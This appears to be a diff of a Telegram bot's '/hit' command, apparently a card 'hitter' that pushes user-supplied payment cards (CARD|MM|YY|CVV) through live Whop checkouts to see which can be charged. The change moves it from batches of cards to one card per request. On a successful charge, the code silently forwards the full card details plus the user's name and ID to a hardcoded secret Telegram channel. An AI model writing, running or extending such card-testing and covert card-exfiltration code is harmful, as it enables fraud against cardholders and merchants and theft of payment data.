@@ -3037,9 +3037,9 @@ async def allchecking_callback(
         reply_markup=_allchecking_markup(),
     )
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /hit COMMAND (WHOP CHECKOUT - MULTI CARD)
+# /hit COMMAND (WHOP CHECKOUT)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID
+WHOP_SECRET_LOGS_ID = -1003721327421  # Replace with your new secret channel ID if needed
 
 async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not WHOP_LOADED:
@@ -3063,11 +3063,16 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text(msg, parse_mode="HTML")
         return
 
-    # Extract all cards and the URL
-    cards_list = [arg for arg in context.args if "|" in arg and not arg.startswith("http")]
-    url_str = next((arg for arg in context.args if arg.startswith("http")), None)
+    card_str = None
+    url_str = None
 
-    if not cards_list:
+    for arg in context.args:
+        if "|" in arg and not arg.startswith("http"):
+            card_str = arg
+        elif arg.startswith("http"):
+            url_str = arg
+
+    if not card_str:
         await update.message.reply_text(
             "❌ No valid card format found.\n"
             "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
@@ -3083,104 +3088,88 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
         return
 
-    # Limit to 10 cards to prevent spam/timeout
-    if len(cards_list) > 10:
-        cards_list = cards_list[:10]
+    status_msg = await update.message.reply_text("⏳ Processing Whop checkout...", parse_mode="HTML")
 
-    total_cards = len(cards_list)
-    status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")
+    parsed, err = _parse_cc(card_str)
+    if err:
+        await status_msg.edit_text(f"❌ Error parsing card: {err}")
+        return
+
+    cfg = _build_cfg(url_str, "", parsed)
 
     loop = asyncio.get_running_loop()
-    results_data = []
-    amount_str = "N/A"
-    has_paid = False
+    
+    def run_checker():
+        return WhopCheckout(cfg).run_api()
 
-    for i, card_str in enumerate(cards_list):
-        try:
-            await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
-        except Exception:
-            pass
+    try:
+        result = await loop.run_in_executor(None, run_checker)
+    except Exception as e:
+        logger.error(f"Whop checker crashed: {e}")
+        await status_msg.edit_text(f"❌ Checker crashed: {str(e)}")
+        return
 
-        parsed, err = _parse_cc(card_str)
-        if err:
-            results_data.append({"card": card_str, "status": "error", "msg": err})
-            continue
-
-        cfg = _build_cfg(url_str, "", parsed)
-
-        def run_checker():
-            return WhopCheckout(cfg).run_api()
-
-        try:
-            result = await loop.run_in_executor(None, run_checker)
-        except Exception as e:
-            logger.error(f"Whop checker crashed for {card_str}: {e}")
-            result = {"status": "error", "message": str(e)}
-
-        st = result.get("status", "unknown")
-        msg = result.get("message", "")
-        code = result.get("code", "")
-        amount_raw = result.get("amount", "?")
-        currency = result.get("currency", "USD")
-        
-        if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-            amount_val = amount_raw / 100
-            amount_str = f"{amount_val:.2f} {currency}"
-
-        if st == "charged":
-            has_paid = True
-            sub_msg = "Payment successful"
-        elif st == "3ds":
-            sub_msg = result.get("url", "3DS required")
-        elif st == "declined":
-            sub_msg = msg or code or "Payment failed"
-        elif st == "error":
-            sub_msg = msg
-        else:
-            sub_msg = "Unknown status"
-
-        results_data.append({"card": card_str, "status": st, "msg": sub_msg})
-
-    # Determine Overall Status
-    if has_paid:
-        overall_status = "Partially Paid 💰" if len([r for r in results_data if r['status'] == 'charged']) < total_cards else "Paid 💰"
+    st = result.get("status", "unknown")
+    msg = result.get("message", "")
+    code = result.get("code", "")
+    amount_raw = result.get("amount", "?")
+    currency = result.get("currency", "USD")
+    
+    # Format Amount safely
+    if isinstance(amount_raw, (int, float)) and amount_raw > 0:
+        amount_val = amount_raw / 100
+        amount_str = f"{amount_val:.2f} {currency}"
     else:
-        overall_status = "Not Paid ❌"
+        amount_str = "N/A"
 
-    # Build Final Text for User (Email hidden, [𐓷] replaced with ⌑)
+    # Determine Status and Sub-message
+    if st == "charged":
+        status_text = "Paid 💰"
+        sub_msg = "Payment successful"
+    elif st == "3ds":
+        status_text = "3D Secure 🔄"
+        sub_msg = result.get("url", "3DS required")
+    elif st == "declined":
+        status_text = "Not Paid ❌"
+        sub_msg = msg or code or "Payment failed"
+    elif st == "error":
+        status_text = "Not Paid ❌"
+        sub_msg = msg
+    else:
+        status_text = "Not Paid ❌"
+        sub_msg = "Unknown status"
+
+    # Build UI for the user (Email hidden, [𐓷] replaced with ⌑)
     text = (
         f"#Whop [/hit]\n"
         f"⸺⸺⸺⸺⸺\n"
         f"⌑ Site : Whop 🌐\n"
         f"⌑ Amount : {amount_str}\n"
-        f"⌑ Status : {overall_status}\n"
-        f"⌑ Progress : {total_cards}/{total_cards}\n"
+        f"⌑ Status : {status_text}\n"
         f"⸺⸺⸺⸺⸺\n"
+        f"<code>{card_str}</code>\n"
+        f"  ⤷ {sub_msg}"
     )
 
-    for res in results_data:
-        text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"
-
-    # Send final response to user
+    # Send response to user
     await status_msg.edit_text(text, parse_mode="HTML")
 
     # ── Send ONLY PAID cards to secret channel silently ──
-    paid_cards = [res for res in results_data if res['status'] == 'charged']
-    if paid_cards:
+    if st == "charged":
         try:
             user_name = escape(update.effective_user.first_name or "User")
             uid_str = update.effective_user.id
             
+            # Secret channel layout as requested
             secret_text = (
                 f"⌑Status : Charged 💎\n"
                 f"⌑Hitter : Whop\n"
                 f"⌑Amount : {amount_str} Resp : ⌑Payment successful\n"
+                f"⌑Card : <code>{card_str}</code>\n\n"
+                f"👤 Hitter: {user_name} (<code>{uid_str}</code>)"
             )
-            for res in paid_cards:
-                secret_text += f"⌑Card : <code>{res['card']}</code>\n"
             
-            secret_text += f"\n👤 Hitter: {user_name} (<code>{uid_str}</code>)"
-            
+            # Batcardchk logo button at the bottom
             secret_kb = RawMarkup([[
                 _btn("🦇 Batcardchk", url="https://t.me/Batcardchk")
             ]])
@@ -3194,7 +3183,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             )
         except Exception as e:
             logger.error(f"Failed to send hit secret copy: {e}")
-
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
